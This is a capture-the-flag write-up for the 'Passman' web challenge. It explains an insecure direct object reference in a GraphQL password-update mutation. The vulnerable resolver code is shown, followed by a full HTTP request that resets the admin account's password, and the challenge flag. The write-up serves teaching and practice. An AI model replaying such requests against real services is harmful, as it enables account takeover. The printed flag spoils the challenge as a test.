## Passman :: Easy

#### Scenario

```
Pandora discovered the presence of a mole within the ministry.
To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager.
Can you hack into the password manager?
```

#### Solve

When we begin this challenge, we arrive on this landing page:

![](/images/passman_login.png)

It seems like we can `Login` and `Register` a new account.
Let's inspect the logic behind these functionalities in the source.
It seems like these are handled by `GraphQL` mutations.

These mutations are in the `helper/GraphQLHelper.js` file.

It seems like there are three mutations pertaining to the authentication of users:

- `RegisterUser`: Handles the creation of a new user.
- `LoginUser`: Handles the authentication of a user.
- `UpdatePassword`: Handles the password update functionality for a user.

It seems like there is some logic flaw in the `UpdatePassword` mutation.
Let's take a look:
```javascript
        UpdatePassword: {
            type: ResponseType,
            args: {
                username: { type: new GraphQLNonNull(GraphQLString) },
                password: { type: new GraphQLNonNull(GraphQLString) }
            },
            resolve: async (root, args, request) => {
                return new Promise((resolve, reject) => {
                    if (!request.user) return reject(new GraphQLError('Authentication required!'));

                    db.updatePassword(args.username, args.password)
                        .then(() => resolve(response("Password updated successfully!")))
                        .catch(err => reject(new GraphQLError(err)));
                });
            }
        },
```

This feature does not validate that the initiator is the target of the password change.

We can see that it check if `request.user` exists.
But then it uses `args.username` to specify which user to reset.

Letting us change the password for any user.

Here is the request used to changed the `admin` password:

```http
POST /graphql HTTP/1.1
Host: 178.128.174.19:30312
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://178.128.174.19:30312/
Content-Type: application/json
Origin: http://178.128.174.19:30312
Content-Length: 192
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNrdWxsa2lkIiwiaXNfYWRtaW4iOjAsImlhdCI6MTY3OTE0NzI3Mn0.TrQXKqwG2KN2GMkwZwftQz3iw8ftKbusYtPYYtLeLfk;
Connection: close


{"query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message } }","variables":{"username":"admin","password":"taken-over"}}
```

Using this request, will reset the `admin` user's password for `taken-over`.

Once this request is done, we can authenticate as `admin` and obtain the flag.

![](/images/passman_flag.png)

```
HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}
```

